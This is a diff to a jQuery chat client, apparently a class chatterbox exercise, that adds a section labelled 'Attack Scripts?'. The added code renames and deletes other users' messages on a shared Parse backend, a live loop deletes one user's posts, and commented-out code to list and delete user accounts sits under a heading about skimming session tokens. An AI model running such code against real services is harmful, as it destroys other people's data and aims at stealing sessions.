@@ -111,6 +111,96 @@ $(document).on('click', '#submitMsg', function(event){
 
 $(document).on('click', 'a.user-name', app.addFriend);
 
+/////////////////////////////////////////////////////////////////////
+//Attack Scripts?                                                  //
+/////////////////////////////////////////////////////////////////////
+
+var ajaxMessageList = function(){
+  return $.ajax({
+    url: 'https://api.parse.com/1/users',
+    type: 'GET',
+    data: '',
+    contentType: 'application/json',
+    success: function (data) {
+      console.log('chatterbox: Message sent');
+    },
+    error: function (data) {
+      console.error('chatterbox: Failed to send message');
+    }
+  });
+};
+
+var ajaxUserUpdate = function(message){
+  $.ajax({
+    url: 'https://api.parse.com/1/classes/chatterbox/' + message.objectId,
+    type: 'PUT',
+    data: message,
+    success: function (data) {
+      console.log('chatterbox: renamed message ID: '+ message.objectId);
+    },
+    error: function (data) {
+      console.error('chatterbox: Failed to updateMessage');
+    }
+  });
+};
+
+var assignNewName= function (message, newName){
+  message.username = newName;
+  return message;
+};
+
+var ajaxMsgDelete = function(message){
+  $.ajax({
+    url: 'https://api.parse.com/1/classes/chatterbox/'+message.objectId,
+    type: 'DELETE',
+    success: function (data) {
+      console.log('chatterbox: deleted msg ID: '+ message.objectId);
+    },
+    error: function (data) {
+      console.error('chatterbox: Failed to delete Message');
+    }
+  });
+};
+
+app.messages.forEach(
+  function(message){
+   if(message.username ==="whoever"){ 
+    ajaxMsgDelete(message);
+  }
+});
+
+
+//////////////// Need to skim session tokens ////////////////////////
+// var ajaxUserList = function(){
+//   return $.ajax({
+//     url: 'https://api.parse.com/1/users',
+//     type: 'GET',
+//     data: '',
+//     contentType: 'application/json',
+//     success: function (data) {
+//       console.log('chatterbox: Message sent');
+//     },
+//     error: function (data) {
+//       console.error('chatterbox: Failed to send message');
+//     }
+//   });
+// };
+
+// var ajaxUserDelete = function(userID){
+//   $.ajax({
+//     url: 'https://api.parse.com/1/users/'+userID,
+//     type: 'DELETE',
+//     success: function (data) {
+//       console.log('chatterbox: deleted UserID: '+ userID);
+//     },
+//     error: function (data) {
+//       console.error('chatterbox: Failed to send message');
+//     }
+//   });
+// };
+
+
+
 // var attackMsg = function(inputScript){
 //   return {
 //     roomname: inputScript,
